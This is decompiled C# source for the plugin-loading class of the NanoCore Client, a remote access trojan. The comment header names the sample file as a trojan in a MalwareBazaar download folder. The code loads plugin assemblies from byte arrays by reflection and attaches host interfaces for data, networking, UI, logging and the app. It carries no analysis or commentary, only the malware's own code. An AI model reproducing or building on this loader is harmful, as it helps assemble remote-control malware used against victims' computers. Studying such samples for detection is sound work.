// Decompiled with JetBrains decompiler
// Type: Class23
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using NanoCore.ClientPlugin;
using NanoCore.ClientPluginHost;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;

[StandardModule]
internal sealed class Class23
{
  public static void smethod_0(byte[] byte_0, GClass2 gclass2_0)
  {
    try
    {
      GClass3 gclass3_1 = new GClass3(gclass2_0.guid_0, gclass2_0.string_0);
      gclass2_0.gclass3_0 = gclass3_1;
      Type type = Class27.smethod_0(byte_0, Class6.type_0, Class6.type_1);
      if ((object) type == null)
        throw new Exception("Client assembly does not meet plugin type requirements.");
      List<object> objectList = new List<object>();
      foreach (ParameterInfo parameter in type.GetConstructors()[0].GetParameters())
      {
        if (typeof (IClientDataHost).Equals(parameter.ParameterType))
          objectList.Add((object) new GClass1(gclass3_1));
        else if (typeof (IClientNetworkHost).Equals(parameter.ParameterType))
          objectList.Add((object) new GClass4(gclass3_1));
        else if (typeof (IClientUIHost).Equals(parameter.ParameterType))
          objectList.Add((object) new GClass9(gclass3_1));
        else if (typeof (IClientLoggingHost).Equals(parameter.ParameterType))
          objectList.Add((object) new GClass7(gclass3_1));
        else if (typeof (IClientAppHost).Equals(parameter.ParameterType))
          objectList.Add((object) new GClass10(gclass3_1));
        else
          objectList.Add((object) null);
      }
      object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type, objectList.ToArray()));
      foreach (Type o in type.GetInterfaces())
      {
        if (typeof (IClientData).Equals(o))
          gclass3_1.iclientData_0 = (IClientData) objectValue;
        else if (typeof (IClientNetwork).Equals(o))
          gclass3_1.iclientNetwork_0 = (IClientNetwork) objectValue;
        else if (typeof (IClientApp).Equals(o))
          gclass3_1.iclientApp_0 = (IClientApp) objectValue;
      }
      Class8.smethod_87(string.Format("Plugin: {0}, Cache: {1}", (object) gclass2_0.string_0, (object) gclass2_0.bool_0));
      if (Class8.list_2.Contains(gclass2_0))
        return;
      Class8.list_2.Add(gclass2_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class8.smethod_85(gclass2_0.gclass3_0, exception_0, "InitializePlugin");
      ProjectData.ClearProjectError();
    }
  }

  public static GClass2 smethod_1(Guid guid_0)
  {
    int num = Class8.list_2.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if (Class8.list_2[index].guid_0 == guid_0)
        return Class8.list_2[index];
    }
    return (GClass2) null;
  }
}
